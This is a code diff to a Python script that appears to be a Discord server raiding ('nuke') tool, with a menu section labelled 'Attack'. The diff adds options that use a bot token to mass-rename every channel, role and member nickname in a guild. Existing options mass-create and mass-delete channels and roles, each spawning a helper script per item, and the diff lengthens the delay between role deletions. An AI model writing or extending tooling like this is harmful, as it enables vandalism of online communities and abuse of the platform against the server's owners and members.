@@ -21,7 +21,7 @@ banner="""
 ░░╚██╔╝░░███████╗
 ░░░╚═╝░░░╚══════╝
 """
-version="alpha 1.6 - v2"
+version="alpha 1.7 - v2"
 def printcolor(text):
     print(Colorate.Horizontal(Colors.purple_to_blue,text,1))
 #varivbles importants
@@ -79,6 +79,7 @@ while True:
     print()
     printcolor("--Attack--")
     printcolor("[1] Create Channels         [2] Delete Channels         [3] Create Roles        [4] Delete Roles")
+    printcolor("[5] Rename Channels         [6] Rename Roles            [7] Rename People")
     print()
     printcolor("--Server Config--")
     cmd=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
@@ -134,4 +135,25 @@ while True:
             for role in rolelist.json():
                 os.system(f"start src/deleteroles.pyw {guildid} {token} {role['id']}")
                 printcolor(f"requested to delete {role['name']}")
-                time.sleep(0.3)
+                time.sleep(0.55)
+    elif cmd=="5":
+        printcolor("New Name:")
+        renamechannel=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        getchannels = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"})
+        for channel in getchannels.json():
+            printcolor(f"requested channel {channel['name']} rename to {renamechannel}")
+            os.system(f"start src/renamechannels.pyw {channel['id']} {token} {renamechannel}")
+    elif cmd=="6":
+        printcolor("New Name:")
+        renamerole=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        getroles = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"})
+        for role in getroles.json():
+            printcolor(f"requested role {role['name']} rename to {renamerole}")
+            os.system(f"start src/renameroles.pyw {guildid} {token} {role['id']} {renamerole}")
+    elif cmd=="7":
+        printcolor("New name:")
+        nicknamechange=input(Colorate.Horizontal(Colors.purple_to_blue,">",1))
+        peoples = requests.get(f"https://discord.com/api/v9/guilds/{guildid}/members?limit=1000", headers={"Authorization": f"Bot {token}"})
+        for people in peoples.json():
+            printcolor(f"requested role {people['user']['username']} rename to {nicknamechange}")
+            os.system(f"start src/changenickname.pyw {guildid} {token} {people['user']['id']} {nicknamechange}")
